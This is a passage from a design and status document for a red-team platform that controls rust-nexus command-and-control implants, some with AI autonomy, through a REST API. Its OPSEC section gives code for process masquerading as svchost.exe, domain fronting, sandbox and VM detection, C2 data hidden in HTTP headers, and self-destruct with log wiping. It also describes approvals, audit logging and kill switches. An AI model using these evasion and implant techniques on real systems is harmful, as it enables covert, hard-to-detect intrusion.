  "timeout": 300000
}
```

**Response:**
```json
{
  "success": true,
  "taskId": "task-550e8400",
  "implantId": "550e8400-e29b-41d4-a716-446655440000",
  "status": "queued"
}
```

**Implementation:**
```typescript
router.post('/implants/:id/task', authenticateSession, async (req, res) => {
  const { id: implantId } = req.params;
  const { type, command, parameters, priority, timeout } = req.body;

  try {
    const taskId = await rustNexusController.deployTask(implantId, {
      id: crypto.randomUUID(),
      type,
      command,
      parameters,
      timeout: timeout || 300000,
      priority: priority || 'medium'
    });

    res.json({
      success: true,
      taskId,
      implantId,
      status: 'queued'
    });
  } catch (error) {
    res.status(400).json({
      success: false,
      error: (error as Error).message
    });
  }
});
```

#### POST /api/v1/implants/:id/kill

Emergency kill switch - permanently terminate an implant.

**Response:**
```json
{
  "success": true,
  "implantId": "550e8400-e29b-41d4-a716-446655440000",
  "status": "killed",
  "message": "Implant terminated successfully"
}
```

**Implementation:**
```typescript
router.post('/implants/:id/kill', authenticateSession, async (req, res) => {
  const { id: implantId } = req.params;

  try {
    await rustNexusController.killSwitch(implantId);

    res.json({
      success: true,
      implantId,
      status: 'killed',
      message: 'Implant terminated successfully'
    });
  } catch (error) {
    res.status(400).json({
      success: false,
      error: (error as Error).message
    });
  }
});
```

---

## Security Considerations

### Authentication & Authorization
- Mutual TLS for implant registration
- Token rotation every 24h
- Permission-based task execution
- Autonomy limits per implant
- Kill switch capability

### Encryption
- End-to-end encryption for all communications
- Per-implant encryption keys
- Perfect forward secrecy
- Secure key exchange

### Monitoring & Control
- Real-time heartbeat monitoring
- Anomaly detection
- Command logging
- Emergency shutdown
- Forensic data capture

### Comprehensive Security Measures

#### 1. Operational Security (OPSEC)

**Implant Stealth:**
```typescript
interface OpSecConfig {
  // Process disguise
  processName: string;              // e.g., "svchost.exe", "systemd-agent"
  processArguments: string[];       // Legitimate-looking command line

  // Network behavior
  beaconInterval: number;           // Randomized heartbeat (60-120s)
  beaconJitter: number;             // Jitter percentage (0-30%)
  maxBandwidth: number;             // Rate limiting (KB/s)
  domainFronting: boolean;          // Use CDN for traffic masking

  // Evasion
  antiAnalysis: boolean;            // Detect debugging/sandboxing
  vmDetection: boolean;             // Detect virtual environments
  sleepEvasion: boolean;            // Use sleep obfuscation techniques
}

// Example configuration
const opSecConfig: OpSecConfig = {
  processName: 'svchost.exe',
  processArguments: ['-k', 'NetworkService'],
  beaconInterval: 90000,  // 90 seconds
  beaconJitter: 20,        // ±20% randomization
  maxBandwidth: 100,       // 100 KB/s max
  domainFronting: true,
  antiAnalysis: true,
  vmDetection: true,
  sleepEvasion: true
};
```

**Traffic Obfuscation:**
```typescript
// Mix legitimate-looking traffic with C2 communications
function obfuscateTraffic(implantComm: Communication): ObfuscatedTraffic {
  return {
    // Embed C2 data in HTTP headers
    headers: {
      'User-Agent': getRandomUserAgent(),
      'Accept-Language': 'en-US,en;q=0.9',
      'X-Request-ID': encodeC2Data(implantComm.payload),  // Hidden in UUID
      'Cookie': generateLegitimateSessionCookie()
    },

    // Use legitimate endpoints
    endpoint: selectRandomEndpoint([
      '/api/telemetry',
      '/api/analytics',
      '/api/metrics',
      '/health'
    ]),

    // Timing randomization
    delay: randomDelay(5000, 15000)
  };
}
```

#### 2. Kill Switch & Emergency Procedures

**Multi-Level Kill Switch:**
```typescript
class EmergencyShutdown {
  /**
   * Level 1: Graceful shutdown
   * - Stop accepting new tasks
   * - Complete current tasks
   * - Clean up artifacts
   * - Disconnect cleanly
   */
  async level1Shutdown(implantId: string): Promise<void> {
    await rustNexusController.sendCommand(implantId, {
      type: 'graceful_shutdown',
      completeTasks: true,
      cleanup: true
    });

    // Wait for confirmation
    await this.waitForShutdown(implantId, 60000);
  }

  /**
   * Level 2: Immediate termination
   * - Kill all tasks immediately
   * - Basic cleanup
   * - Force disconnect
   */
  async level2Shutdown(implantId: string): Promise<void> {
    await rustNexusController.sendCommand(implantId, {
      type: 'immediate_shutdown',
      killTasks: true,
      quickCleanup: true
    });

    await this.waitForShutdown(implantId, 10000);
  }

  /**
   * Level 3: Self-destruct
   * - Delete implant binary
   * - Wipe logs and artifacts
   * - Terminate without response
   */
  async level3Shutdown(implantId: string): Promise<void> {
    await rustNexusController.sendCommand(implantId, {
      type: 'self_destruct',
      deleteBinary: true,
      wipeLogs: true,
      removePeristence: true
    });

    // Don't wait for response
  }

  /**
   * Mass kill switch - terminate all implants
   */
  async massKillSwitch(reason: string): Promise<void> {
    const implants = await rustNexusController.getActiveImplants();

    console.error(`[EMERGENCY] Mass kill switch activated: ${reason}`);

    await Promise.allSettled(
      implants.map(implant => this.level2Shutdown(implant.id))
    );

    // Log the event
    await db.insert(auditLogs).values({
      action: 'mass_kill_switch',
      reason,
      affectedImplants: implants.length,
      timestamp: new Date()
    });
  }
}
```

#### 3. Audit Logging & Forensics

**Comprehensive Audit Trail:**
```typescript
// All implant actions are logged for forensic analysis
interface AuditLogEntry {
  timestamp: Date;
  implantId: string;
  action: string;
  userId?: string;           // Operator who initiated
  details: {
    command?: string;
    parameters?: any;
    result?: any;
    autonomyDecision?: boolean;  // Was this an AI decision?
    approvalRequired?: boolean;
    approvedBy?: string;
  };
  securityLevel: 'low' | 'medium' | 'high' | 'critical';
  encrypted: boolean;
}

// Automated anomaly detection
class AnomalyDetector {
  async detectAnomalies(implantId: string): Promise<Anomaly[]> {
    const anomalies: Anomaly[] = [];

    // Check for unusual command patterns
    const commandFrequency = await this.analyzeCommandPatterns(implantId);
    if (commandFrequency.deviationScore > 3.0) {
      anomalies.push({
        type: 'unusual_command_pattern',
        severity: 'medium',
        description: 'Command execution frequency significantly deviated from baseline'
      });
    }

    // Check for out-of-scope operations
    const outOfScope = await this.checkScopeViolations(implantId);
    if (outOfScope.length > 0) {
      anomalies.push({
        type: 'scope_violation',
        severity: 'critical',
        description: `Attempted operations outside defined scope: ${outOfScope.join(', ')}`
      });
    }

    // Check for defensive tool interactions
    const defenseInteractions = await this.detectDefensiveTools(implantId);
    if (defenseInteractions.length > 0) {
      anomalies.push({
        type: 'defensive_tool_detected',
        severity: 'high',
        description: `Potential defensive tool interaction: ${defenseInteractions.join(', ')}`
      });
    }

    return anomalies;
  }
}
```

#### 4. Access Control & Authorization

**Role-Based Implant Control:**
```typescript
enum ImplantPermission {
  VIEW = 'implant:view',
  DEPLOY = 'implant:deploy',
  TASK = 'implant:task',
  SHELL = 'implant:shell',
  KILL = 'implant:kill',
  CONFIGURE = 'implant:configure',
  AUTONOMY_CHANGE = 'implant:autonomy:change'
}

// Check permissions before allowing operations
async function checkImplantPermission(
  userId: string,
  permission: ImplantPermission
): Promise<boolean> {
  const user = await db.query.users.findFirst({
    where: (users, { eq }) => eq(users.id, userId),
    with: { role: true }
  });

  return user?.role.permissions.includes(permission) || false;
}

// Approval workflow for high-risk operations
async function requireApproval(
  operation: string,
  implantId: string,
  requestedBy: string
): Promise<boolean> {
  const approval = await db.insert(approvalRequests).values({
    operation,
    resourceType: 'implant',
    resourceId: implantId,
    requestedBy,
    status: 'pending'
  }).returning();

  // Notify approvers
  await notifyApprovers({
    type: 'implant_operation_approval',
    operation,
    implantId,
    requestId: approval[0].id
  });

  // Wait for approval (or timeout)
  return this.waitForApproval(approval[0].id, 300000); // 5 minute timeout
}
```

#### 5. Data Protection & Privacy

**PII Protection:**
```typescript
// Automatically redact PII from implant communications
function redactPII(data: any): any {
  const piiPatterns = {
    ssn: /\b\d{3}-\d{2}-\d{4}\b/g,
    creditCard: /\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b/g,
    email: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g,
    phone: /\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/g
  };

  let sanitized = JSON.stringify(data);

  for (const [type, pattern] of Object.entries(piiPatterns)) {
    sanitized = sanitized.replace(pattern, `[REDACTED_${type.toUpperCase()}]`);
  }

  return JSON.parse(sanitized);
}

// Data retention policy
async function enforceDataRetention(): Promise<void> {
  // Delete implant communications older than 90 days
  await db.delete(implantComms)
    .where(
      lt(implantComms.timestamp, new Date(Date.now() - 90 * 24 * 60 * 60 * 1000))
    );

  // Archive task history older than 180 days
  const oldTasks = await db.select().from(implantTasks)
    .where(
      lt(implantTasks.createdAt, new Date(Date.now() - 180 * 24 * 60 * 60 * 1000))
    );

  if (oldTasks.length > 0) {
    await archiveTasks(oldTasks);
    await db.delete(implantTasks)
      .where(
        lt(implantTasks.createdAt, new Date(Date.now() - 180 * 24 * 60 * 60 * 1000))
      );
  }
}
```

#### 6. Incident Response Procedures

**Automated Incident Response:**
```typescript
class ImplantIncidentResponse {
  /**
   * Respond to suspected compromise
   */
  async handleSuspectedCompromise(implantId: string, evidence: Evidence): Promise<void> {
    console.error(`[INCIDENT] Suspected implant compromise: ${implantId}`);

    // 1. Immediately isolate implant
    await rustNexusController.setAutonomyLevel(implantId, 1); // Lock to manual control

    // 2. Stop all tasks
    const runningTasks = await db.select().from(implantTasks)
      .where(
        and(
          eq(implantTasks.implantId, implantId),
          eq(implantTasks.status, 'running')
        )
      );

    for (const task of runningTasks) {
      await rustNexusController.cancelTask(task.id);
    }

    // 3. Collect forensic data
    const forensics = await this.collectForensics(implantId);

    // 4. Notify operators
    await this.notifyIncident({
      implantId,
      type: 'suspected_compromise',
      evidence,
      forensics,
      actions: ['isolated', 'tasks_cancelled', 'forensics_collected']
    });

    // 5. Await operator decision (kill or investigate)
    const decision = await this.waitForOperatorDecision(implantId);

    if (decision === 'kill') {
      await rustNexusController.killSwitch(implantId);
    }
  }

  /**
   * Handle lost implant connection
   */
  async handleLostConnection(implantId: string): Promise<void> {
    const implant = await db.query.agenticImplants.findFirst({
      where: (implants, { eq }) => eq(implants.id, implantId)
    });

    if (!implant) return;

    const timeSinceHeartbeat = Date.now() - implant.lastHeartbeat.getTime();

    if (timeSinceHeartbeat > 300000) { // 5 minutes
      // Mark as disconnected
      await db.update(agenticImplants)
        .set({ status: 'disconnected' })
        .where(eq(agenticImplants.id, implantId));

      // Investigate cause
      await this.investigateDisconnection(implantId, timeSinceHeartbeat);
    }
  }
}
```

### Security Compliance

- **NIST Cybersecurity Framework**: Implant security aligns with Identify, Protect, Detect, Respond, Recover functions
- **OWASP Secure Coding**: All code follows OWASP top 10 mitigation strategies
- **Principle of Least Privilege**: Implants run with minimal required permissions
- **Defense in Depth**: Multiple security layers (encryption, authentication, monitoring)
- **Logging & Accountability**: Complete audit trail for all implant operations

---

## Testing Requirements

### Unit Tests
- [ ] Implant registration logic
- [ ] Task distribution algorithm
- [ ] Communication encryption
- [ ] Authentication mechanisms

**Target Coverage:** 80%

### Integration Tests
- [ ] End-to-end implant deployment
- [ ] Task execution workflow
- [ ] Secure communication
- [ ] Heartbeat monitoring

**Target Coverage:** 70%

### Security Tests
- [ ] Penetration testing of communication
- [ ] Authentication bypass attempts
- [ ] Encryption verification
- [ ] Kill switch functionality

**Target Coverage:** 90%

---

## Implementation Timeline

### Tier 2: Foundation (Week 3-4)
- [ ] rust-nexus controller service
- [ ] Basic implant registration
- [ ] Simple task deployment
- [ ] Implant management UI (basic)
- [ ] Authentication and encryption

### Tier 3: Advanced (Post-Beta, 1-2 months)
- [ ] Full AI agent integration for implants
- [ ] Advanced autonomy controls
- [ ] Distributed workflow orchestration
- [ ] Telemetry dashboard
- [ ] Cross-platform implant support
- [ ] Advanced security features

---

## Dependencies

### External Dependencies
- rust-nexus (https://github.com/cmndcntrlcyber/rust-nexus)
- Rust toolchain for building implants
- TLS certificate authority

### Internal Dependencies
- Agent workflow orchestrator
- Existing agent system
- Operation management

### Library Dependencies
- WebSocket library for real-time communication
- Encryption libraries
- Binary compilation tools

---

## Success Metrics

### Functional Requirements
- [ ] Implants successfully deployed
- [ ] Tasks execute remotely
- [ ] Communication secure and reliable
- [ ] Management UI operational
- [ ] Kill switch works

### Performance Requirements
- [ ] Task deployment <5 seconds
- [ ] Command response <1 second
- [ ] Heartbeat latency <500ms
- [ ] Handles 50+ concurrent implants

### Security Requirements
- [ ] All communications encrypted
- [ ] No authentication bypasses
- [ ] Audit logging complete
- [ ] Kill switch 100% reliable

---

## Related Documentation
- [FUTURE-ENHANCEMENTS.md](../FUTURE-ENHANCEMENTS.md) - Parent document
- [01-CRITICAL-BUGS.md](01-CRITICAL-BUGS.md) - Critical bugs
- [rust-nexus Repository](https://github.com/cmndcntrlcyber/rust-nexus)

---

**Status Legend:**
- 🔴 Blocking - Must be completed first
- 🟡 High Priority - Important for beta
- 🟢 Medium Priority - Nice to have
- ✅ Complete
- 🚧 In Progress
- ⏸️ Blocked

---

**Last Updated:** December 4, 2025
**Verification Date:** February 4, 2026
**Maintained By:** RTPI Development Team

---

## VERIFICATION SUMMARY (2026-02-04)

### Core Features Status (From v2.0 ROADMAP Phase 6)

**✅ Implemented (4/5 - 80%)**
1. ✅ **Multi-Architecture Builds** - `shared/schema.ts:55-56` agentPlatformEnum and agentArchitectureEnum (windows/linux, x64/x86/arm64), `server/services/agent-build-service.ts:20-90` with Docker cross-compilation
2. ✅ **Auto-Registration** - `server/services/rust-nexus-controller.ts:20-60` REGISTER/REGISTER_ACK message types with auto-generated ID
3. ✅ **Load Balancing** - `server/services/rust-nexus-task-distributor.ts:9-50` intelligent task assignment with score-based distribution
4. ✅ **Emergency Kill Switch** - `server/services/rust-nexus-security.ts:1-50` security hardening module, TERMINATE message type in controller

**⚠️ Partially Implemented (1/5 - 20%)**
5. ⚠️ **Autonomy Level Controls** - Autonomy fields exist in agent schema but no dedicated AutonomyConfig.tsx UI component

### System Implementation Status
- ✅ **rust-nexus Submodule:** Integrated at `rust-nexus/` directory
- ✅ **Controller Service:** `server/services/rust-nexus-controller.ts` with gRPC communication
- ✅ **Build Service:** Multi-platform agent builds operational
- ✅ **Task Distribution:** Intelligent load balancing with capability matching
- ✅ **Security:** Certificate-based authentication, encryption, kill switch
- ✅ **Database Schema:** agents, agentBuilds, devices, certificates tables all implemented

### Missing Features for v2.3
1. Frontend UI for autonomy level configuration (slider/input for levels 1-10 with risk warnings)

### Overall Assessment
**Status:** 80% complete with fully operational agentic implant system. rust-nexus integration successful with multi-architecture builds, auto-registration, intelligent load balancing, and security features. Only missing UI component for autonomy configuration.